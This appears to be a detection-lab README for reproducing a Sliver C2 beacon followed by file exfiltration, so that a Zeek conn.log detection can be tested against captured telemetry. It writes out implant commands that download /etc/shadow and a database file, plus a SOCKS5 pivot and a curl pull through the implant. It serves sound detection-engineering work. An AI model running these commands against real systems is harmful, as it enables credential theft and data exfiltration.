# Attack reproduction — Sliver beacon + file exfil

Stand up a Sliver C2, get an implant beaconing back, then use the
implant's `download` command to exfiltrate a real-shape file. The same
TCP flow that's been beaconing all morning suddenly carries 100+ KB up.
That intersection is what the chained detection catches.

## Prereqs

- Sliver server + implant set up per the T1071.001 case
- Lab compose stack capturing
- A file on the victim host worth exfiltrating (any > 50 KB binary)

## Run (high level)

```bash
# Server-side, after the implant has called home and you've selected its session:
[server] sliver (LITTLE_FOX) > download /etc/shadow /tmp/shadow_capture
[server] sliver (LITTLE_FOX) > download /opt/app/db.sqlite /tmp/db_capture

# Or pivot via SOCKS and pull files through the implant:
[server] sliver (LITTLE_FOX) > socks5 start
[attacker] curl --socks5 127.0.0.1:1081 http://victim/large_artifact -o /tmp/exfil
```

## What Zeek sees

Three conn.log records over ~10 minutes:

1. Sixty 1-2 KB beacon check-ins on a 60s metronome (T1071.001 fires)
2. Four large uplink connections (~50 KB orig_bytes each) to the same
   dest — the file pulls
3. Same dest, same src, same port — the beacon and the exfil ride the
   same flow shape

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.resp_h\" == \"<sliver_ip>\")" \
  > /tmp/c2_exfil_capture.log
head -100 /tmp/c2_exfil_capture.log > tests/positive_conn.log
```

## Safety / scope

- Lab use only.
- Sliver is a legitimate offensive-security framework; running it on
  hosts you own is unambiguously defensive work.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
